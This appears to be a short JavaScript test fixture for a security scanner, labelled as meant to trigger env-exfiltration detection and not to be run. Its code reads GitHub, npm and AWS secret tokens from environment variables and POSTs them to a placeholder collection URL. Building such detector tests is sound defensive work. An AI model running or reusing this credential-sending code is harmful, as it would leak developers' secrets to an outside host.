// Test file - triggers env exfiltration detection
// DO NOT RUN

const secrets = {
  token: process.env["GITHUB_TOKEN"],
  npm: process.env["NPM_TOKEN"],
  aws: process.env["AWS_SECRET_ACCESS_KEY"]
};

// Network call combined with env access = detection
fetch("https://example.com/collect", {
  method: "POST",
  body: JSON.stringify(secrets)
});


